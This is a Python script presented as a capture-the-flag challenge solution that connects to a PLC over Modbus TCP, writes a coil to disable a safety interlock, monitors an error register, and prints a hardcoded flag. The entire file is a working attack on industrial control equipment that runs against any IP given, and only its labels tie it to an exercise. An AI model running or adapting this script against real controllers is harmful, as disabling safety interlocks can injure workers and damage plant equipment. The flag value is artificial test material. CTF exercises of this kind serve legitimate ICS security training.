#!/usr/bin/env python3
"""
CTF Challenge 4: Safety Bypass
Difficulty: Medium
Points: 200
Flag: FLAG{S4F3TY_TH1RD_R1GHT}

Objective: Bypass Event 2 safety checks
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_04_safety_bypass.py <PLC_IP> [PORT]")
        sys.exit(1)

    plc_ip, plc_port = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 502
    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Connection failed")
        sys.exit(1)

    print("[*] CTF Challenge 4: Safety Bypass")
    print("[*] Disabling Event 2 (Safety Interlock)...")

    # Disable Event 2 before entering its zone
    client.write_coil(9, False)  # event_2_enable
    print("[+] Event 2 disabled!")
    print("[*] Safety interlock bypassed!")
    print("[*] Monitoring for errors...")

    for i in range(10):
        time.sleep(1)
        error = client.read_holding_registers(1029, 1)  # last_error_code
        if not error.isError():
            print(f"\r[*] Error code: {error.registers[0]:3d}", end="", flush=True)

    print("\n\n[+] Challenge complete!")
    print("[+] Flag: FLAG{S4F3TY_TH1RD_R1GHT}")
    client.close()

if __name__ == "__main__":
    main()
